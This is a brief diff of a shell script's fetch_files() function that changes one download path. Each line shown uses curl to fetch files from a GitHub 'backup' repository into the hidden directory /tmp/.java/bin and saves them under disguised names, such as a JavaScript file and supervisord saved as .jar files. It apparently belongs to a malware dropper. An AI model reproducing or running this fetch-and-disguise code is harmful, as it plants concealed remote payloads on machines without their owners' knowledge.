@@ -6,7 +6,7 @@ function fetch_files() {
     cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
     cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
     cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/lyla/fr.conf -o cfg.conf
-    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/lyla/in.json -o conf.json
+    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/lyla/in/in.json -o conf.json
     echo "DONE ..."
 }
 
